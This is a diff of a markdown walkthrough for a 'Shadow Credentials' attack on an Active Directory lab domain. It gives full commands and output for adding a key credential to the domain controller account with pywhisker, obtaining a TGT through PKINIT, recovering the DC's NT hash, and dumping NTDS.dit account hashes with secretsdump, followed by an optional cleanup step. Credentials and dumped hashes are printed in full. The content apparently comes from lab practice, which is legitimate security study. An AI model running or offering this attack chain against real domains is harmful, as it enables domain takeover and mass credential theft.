@@ -1,5 +1,9 @@
 # Shadow Credentials
 
+## tips
+1. use python3.8
+2. use the `-dc-ip` flag to point to the domain controller
+
 ## Scenario
 domain: lab.local
 ADCS: present and required for PKINIT
@@ -10,11 +14,11 @@ privilege: AddKeyCredentialLink over Domain Controller: DC$
 ## Step #1: List key credentials
 listing the keys on the DC. the out gives an either/or answer so we should try going for it
 
-## Command
+### Command
 ```bash
 python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --target 'dc$' --action list
 ```
-## Output
+### Output
 ```
 [*] Searching for the target account
 [*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
@@ -22,11 +26,12 @@ python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --ta
 ```
 
 ## Action #2: Add key credentials
-## Command
+
+### Command
 ```bash
 python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --target 'dc$' --action add
 ```
-## Output
+### Output
 ```
 [*] Searching for the target account
 [*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
@@ -48,12 +53,12 @@ python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --ta
 ## Step #3: Getting TGT
 using PKINIT, we request a TGT
 
-## Command
+### Command
 ```bash
 python3.8 /opt/PKINITtools/gettgtpkinit.py -v -dc-ip dc -cert-pfx dnUC8Y14.pfx -pfx-pass cCw1PLYcsQsUJggLshDq lab.local/dc$ dnUC8Y14.ccache
 ```
 
-## Output
+### Output
 ```
 2022-07-05 05:58:06,827 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
@@ -70,13 +75,13 @@ INFO:minikerberos:Saved TGT to file
 ## Step #4: Getting NTHASH
 using the key generated in Step #3 and exporting the generated TGT into our kerberos cache, we're going to get the NTLM hash for the DC :D
 
-## Command
+### Command
 ```bash
 export KRB5CCNAME=/opt/pywhisker/dnUC8Y14.ccache
 python3.8 /opt/PKINITtools/getnthash.py -dc-ip dc lab.local/'DC$' -key 5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
 ```
 
-## Output
+### Output
 ```
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -87,13 +92,14 @@ Recovered NT Hash
 ```
 
 ## Step #5: Dumping NTDS.dit
+hashes. hashes everwhere
 
-## Command:
+### Command:
 ```bash
 secretsdump.py -just-dc-ntlm -dc-ip dc lab.local/'DC$'@dc.lab.local -hashes :8028aac845cdc82881b55e1d0b1c88e5
 ```
 
-## Output:
+### Output:
 ```
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -119,4 +125,21 @@ SFDRQNQH$:1119:aad3b435b51404eeaad3b435b51404ee:094a2d83f66f017ccd989a024e7bceee
 JWHMHWBU$:1120:aad3b435b51404eeaad3b435b51404ee:53fb78699467a971ee2a51109afcf7e2:::
 gmsa1$:1122:aad3b435b51404eeaad3b435b51404ee:2be99b0ca6594829276aaf74358624b8:::
 [*] Cleaning up... 
+```
+
+## (Optional) Step #6: Removing the msDS-KeyCredentialLink
+you will need the device GUID for this stem --> it's provided in the output of the command in step #1
+
+### Command
+```bash
+python3.8 pywhisker.py --dc-ip dc -d 'lab.local' -u 'sysadmin' -p 'Abc123!!' --target 'DC$' --action remove --device-id 'e3550b17-9746-d819-99eb-0d907c12922d'
+```
+
+### Output
+```
+[*] Searching for the target account
+[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
+[*] Found value to remove
+[*] Updating the msDS-KeyCredentialLink attribute of DC$
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
 ```
